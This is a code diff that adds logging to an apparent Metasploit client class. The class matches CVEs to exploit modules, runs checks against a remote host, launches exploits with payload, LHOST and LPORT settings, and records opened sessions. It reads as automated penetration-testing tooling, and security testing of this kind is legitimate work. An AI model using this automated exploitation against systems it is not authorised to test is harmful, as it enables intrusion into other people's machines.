@@ -187,10 +187,16 @@ class MsfClient:
                               f"({len(service.cves)} cve)")
         by_module = {}
         for cve in service.cves:
-            for entry in self._search_cve(cve.cve_id):
-                if not self._acceptable(entry):
-                    continue
+            hits = self._search_cve(cve.cve_id)
+            logger.debug("search %s (%s:%s) -> %d msf module(s)",
+                         cve.cve_id, label, service.port, len(hits))
+            for entry in hits:
                 full = entry.get("fullname", "")
+                if not self._acceptable(entry):
+                    logger.debug("  reject %s type=%s rank=%s",
+                                 full, entry.get("type"), entry.get("rank"))
+                    continue
+                logger.debug("  accept %s rank=%s", full, entry.get("rank"))
                 cur = by_module.get(full)
                 if cur is None or cve.cvss > cur[2]:
                     by_module[full] = (entry, cve.cve_id, cve.cvss)
@@ -202,6 +208,14 @@ class MsfClient:
             out.append(Candidate(
                 module=entry.get("fullname", ""), cve_id=cve_id,
                 rank=_rank_name(entry.get("rank")), port=service.port, source="msf"))
+        if out:
+            logger.info("search %s:%s cves=%d -> %d candidate(s): %s",
+                        label, service.port, len(service.cves), len(out),
+                        ", ".join(c.module for c in out))
+        else:
+            logger.info("search %s:%s cves=%d -> 0 fireable modules "
+                        "(rank floor %d)", label, service.port,
+                        len(service.cves), self.cfg.rank_floor)
         return out
 
     # -- check (console path) --
@@ -224,7 +238,11 @@ class MsfClient:
             data = self._console_run(console, "\n".join(lines) + "\n",
                                      self.cfg.check_timeout)
             code = _parse_check_output(data)
-            return verdict_from_msf(code), _summarize_check(data)
+            verdict = verdict_from_msf(code)
+            detail = _summarize_check(data)
+            logger.info("check %s @ %s:%s -> %s (%s)", candidate.module,
+                        rhost, port, verdict.value, detail)
+            return verdict, detail
         except Exception as e:
             logger.warning("check error %s on %s: %s", candidate.module, rhost, e)
             return Verdict.UNKNOWN, f"check error: {e}"
@@ -290,6 +308,8 @@ class MsfClient:
             self._activity("fire", f"execute {candidate.module} "
                                    f"payload={payload_name} LHOST={lhost} "
                                    f"LPORT={lport} @ {rhost}")
+            logger.info("fire %s @ %s:%s payload=%s LHOST=%s LPORT=%s",
+                        candidate.module, rhost, port, payload_name, lhost, lport)
             result = exploit.execute(payload=payload)
             if not isinstance(result, dict) or not result.get("uuid"):
                 logger.warning("execute returned no uuid for %s: %s",
@@ -299,8 +319,11 @@ class MsfClient:
             job_id = result.get("job_id")
             matched = self._await_session(uuid, self.cfg.exploit_timeout)
             if matched is None:
+                logger.info("fire %s @ %s -> no session", candidate.module, rhost)
                 return None
             sid, sdict = matched
+            logger.info("fire %s @ %s -> SESSION %s opened", candidate.module,
+                        rhost, sid)
             return Session(
                 session_id=str(sid), module=candidate.module, payload=payload_name,
                 info=str(sdict.get("info") or sdict.get("desc") or ""))
